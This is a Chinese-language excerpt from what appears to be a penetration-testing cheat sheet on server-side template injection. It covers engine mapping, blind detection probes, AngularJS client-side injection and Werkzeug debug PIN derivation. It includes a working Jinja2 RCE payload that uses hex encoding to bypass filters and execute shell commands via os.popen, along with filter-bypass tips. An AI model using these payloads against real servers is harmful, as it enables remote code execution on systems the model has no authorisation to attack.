...
> 相关主题：[expression-language-injection.md](./expression-language-injection.md)（Java SpEL/OGNL，与模板注入不同攻击面）。
> 本文件自包含：Jinja2 深度（REF: jinja2-exploitation）、多引擎 RCE 速查与沙箱逃逸（REF: multi-engine-payloads）、Twig/Mako/FreeMarker/Pug/Django 与过滤绕过大全（REF: other-engines-and-bypass）全部内联。
...
├─ Twig？→ 下文对应 REF 章节
├─ Mako/FreeMarker/Pug？→ 下文对应 REF 章节
├─ Django？→ 下文对应 REF 章节
│   无 RCE！优先级：上下文变量穷举 → request.META → settings → admin 路径发现
└─ 有过滤？→ 下文对应 REF 章节（过滤绕过部分）
```

**Jinja2 速查**（完整 payload → 下文对应 REF 章节）：
```
...
> 融合自 yaklang/hack-skills `ssti-server-side-template-injection`，与上文去重后仅保留独有内容。检测 polyglot 序列见上文「通用检测 Polyglot」；Jinja2 基础链（lipsum/cycler/config/mro）见「RCE（最后手段）」；FreeMarker/Twig/Velocity/ERB/Thymeleaf RCE 见「多引擎 RCE Payload 速查表」与 REF: other-engines-and-bypass；`_`/`.`/`()`/引号/关键字过滤绕过见「过滤绕过大全」。

## 引擎-语言映射补充表（base 表之外的引擎）

| 模板引擎 | 语言 | 框架 |
|---|---|---|
| Smarty | PHP | 通用 |
| Velocity | Java | 各 Java 栈 |
| Pebble | Java | 各 Java 栈 |
...
## Jinja2 独有 RCE 链（补 base 未覆盖的两条）

**动态定位 Popen 下标**（Python 版本不同下标会漂移，不要硬编码 258）：
...
**request 对象 globals 链**（`config` 被封时用；hex 编码绕 `_` 过滤）：

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

沙箱逃逸补充：关键字（class/mro）被过滤时同样走 `|attr('\x5f\x5fclass\x5f\x5f')` hex 形式；输出被自动转义时加 `|safe`。

## 客户端模板注入（AngularJS CSTI）

页面把用户数据渲染进 AngularJS 模板表达式时（`{{1+1}}` 显示 `2` = 中招）：
...
- 查询参数、表单字段（个人资料名/简介/内容）
- 错误页：`404 Not Found: /PAYLOAD`
- 邮件模板：密码重置邮件里的姓名
- 最危险：Flask `render_template_string(user_input)` —— 整个用户输入直接当模板

## 盲注 SSTI

- **布尔**：`(3*4/2)` 与 `3*)2(/4` 对比 —— 前者正常后者报错 = 表达式被求值
- **时间**：`{{sleep(5)}}` 或对应引擎等价物
- **OOB**：无直接输出时用模板表达式发 DNS/HTTP 回调
- **报错**：真假条件触发不同报错

报错式指纹辅助：`(1/0).zxy.zxy` 的堆栈通常直接暴露引擎名。

## Flask debug PIN 计算

Werkzeug 调试器暴露但被 PIN 保护时，PIN 由主机特征值推导（喂给公开 PIN 计算脚本）：

1. `username` —— `/etc/passwd` 里跑 Flask 进程的用户
2. 模块名 —— 通常 `flask.app` 或 `Flask`
3. 应用路径 —— `app.py` 或真实主文件名
4. MAC 地址 —— `/sys/class/net/eth0/address` 转十进制
